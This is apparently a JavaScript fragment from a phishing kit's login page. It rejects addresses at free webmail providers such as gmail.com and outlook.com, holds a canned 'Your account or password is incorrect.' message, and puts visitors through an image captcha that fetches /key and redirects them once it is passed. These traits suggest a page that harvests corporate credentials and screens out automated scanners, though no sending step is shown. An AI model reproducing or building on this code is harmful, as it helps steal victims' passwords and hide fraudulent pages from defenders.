var 
email = '', 
failEmails = [
    'gmail.com',
    'yahoo.com',
    'yandex.com',
    'protonmail.com',
    'protonmail.ch',
    'gmx.com',
    'gmx.us',
    'icloud.com',
    'zoho.com',
    'aol.com',
    'outlook.com'
],
FMsg= 'Your account or password is incorrect.',
pass = '',
captcha = new class {
    constructor () {
        var selected = [
            'lion',
            'fish',
            'banana',
            'cow',
            'bicycle'
        ],
        pos = Math.round(Math.random() * 5),
        data = {},
        images = [
            document.getElementById(selected[0]),
            document.getElementById(selected[1]),
            document.getElementById(selected[2]),
            document.getElementById(selected[3]),
            document.getElementById(selected[4])
        ];
        images.forEach( element => {
            element.addEventListener( 'click', () => {
                for (let i = 0; i < images.length; i++) {
                    var e = images[i];
                    e.classList.remove( 'selected')
                }
                element.classList.add( 'selected')
                data = {
                    selected: element.getAttribute('id')
                }
            })
        })
        if( pos >= 5) pos = 4
        document.getElementById('cap-id').innerHTML = selected[pos]
        document.getElementById('action').addEventListener( 'click', () => {
            if( data.selected == selected[pos]){
                fetch('/key')
                .then( data => data.json())
                .then( res => {
                    window.location.href = res.adr
                })
            }
            else{
                for (let i = 0; i < images.length; i++) {
                    var e = images[i];
                    e.classList.remove( 'selected')
                }
            }
        })
    }
}